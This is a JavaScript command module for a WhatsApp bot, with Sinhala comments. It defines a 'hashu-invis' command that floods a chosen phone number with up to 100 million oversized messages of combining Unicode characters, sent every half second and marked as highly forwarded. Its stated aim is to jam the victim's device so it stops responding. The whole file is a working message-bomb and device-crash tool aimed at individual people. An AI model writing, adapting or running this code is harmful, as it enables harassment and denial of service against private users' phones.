const { cmd } = require('../command');

cmd({
    pattern: "hashu-invis",
    alias: ["hang", "slow"],
    desc: "Jam target WhatsApp and block outgoing messages",
    category: "owner",
    react: "⏳",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        // අවසර ලත් අංක පමණක් (ඔයා කලින් දුන්නු අංක ටික මෙතනට දාන්න)
        const authorizedNumbers = ['94740137623']; 
        if (!authorizedNumbers.includes(senderNumber) && !isOwner) return reply("Not Premission ! ❌");

        if (!args[0] && !m.quoted) return reply("𝐫𝐞𝐩𝐥𝐲 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐨𝐫 𝐭𝐲𝐩𝐞 𝐜𝐦𝐝 𝐚𝐧𝐝 𝐢𝐧𝐩𝐮𝐭 𝐧𝐮𝐦𝐛𝐞𝐫... 🤍🙂");

        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        reply("😹 𝐓𝐡𝐞 𝐄𝐧𝐝 𝐇𝐚𝐬𝐡𝐮-𝐁𝐮𝐠 𝐒𝐲𝐬𝐭𝐞𝐦 𝐈𝐬 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠...");

        // 1. මේ ලූප් එකෙන් වෙන්නේ අතිශය බර වැඩි Payload එකක් දිගටම යවන එක
        // මේක නිසා එයාගේ ෆෝන් එකේ ඩේටා හුවමාරුව (Processing) හිර වෙනවා.
        for (let i = 0; i < 100000000; i++) {
            const jammerPayload = " \u0345\u0361\u0345\u1160\u1160".repeat(8000) + "҉".repeat(1000);
            
            await conn.sendMessage(target, { 
                text: jammerPayload,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true
                }
            });
            
            // mr hashuu
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        reply("✅ Jamming Finished. Target device should be unresponsive now.");

    } catch (e) {
        console.error(e);
    }
});
